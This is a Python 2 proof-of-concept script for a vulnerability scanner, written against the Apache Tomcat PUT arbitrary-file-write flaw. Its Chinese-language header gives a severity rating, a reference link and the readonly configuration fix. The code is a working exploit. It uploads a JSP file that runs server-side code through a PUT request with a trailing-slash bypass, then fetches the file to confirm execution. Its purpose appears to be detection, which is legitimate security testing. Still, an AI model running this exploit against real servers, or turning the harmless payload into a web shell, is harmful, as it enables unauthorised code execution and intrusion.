#!/usr/bin/env python
# -*- coding:utf-8 -*-

'''
    name: Tomcat 任意写文件漏洞
    info: 通过PUT方法上传任意文件，可以达到任意代码执行的效果。
    level: 高危
    type: 代码执行
    url: https://paper.seebug.org/398/
    repair: 1.升级到Apache Tomcat更高版本。
            2.注释掉readonly配置或配置readonly的值为true。
              在Tomcat的web.xml 文件中配置org.apache.catalina.servlets.DefaultServlet的初始化参数
              <init-param>
              <param-name>readonly</param-name>
              <param-value>true</param-value> 
              </init-param>
'''

import urllib2,urlparse
from POC_Framework import POC

class PutRequest(urllib2.Request):
    '''support put method in urllib2'''
    def __init__(self, *args, **kwargs):
        self._method = "PUT"
        return urllib2.Request.__init__(self, *args, **kwargs)

    def get_method(self, *args, **kwargs):
        return "PUT"

class myPOC(POC):
    
    #单IP的POC
    def check(self, ip, port, timeout=5):
        result = ""
        payload = "<%out.println(1963*4);%>"
        filename = "{}.jsp".format(self.random_str(16))
        if port == 443:
            url = "https://%s" % (ip)
        else:
            url = "http://%s:%d" % (ip, port)
        try:
            url = urllib2.urlopen(url, timeout=timeout).geturl()
        except:
            return False
        shell_url = urlparse.urljoin(url, filename)
        target_url = shell_url + "/"
        request = PutRequest(target_url, payload)
        try:
            urllib2.urlopen(request, timeout=timeout)
        except:
            return False
        else:
            try:
                resp = urllib2.urlopen(shell_url, timeout=timeout)
            except:
                return False
            else:
                if "7852" in resp.read():
                    return  True

if __name__ == "__main__":

    Check_POC = myPOC()
    Check_POC.run()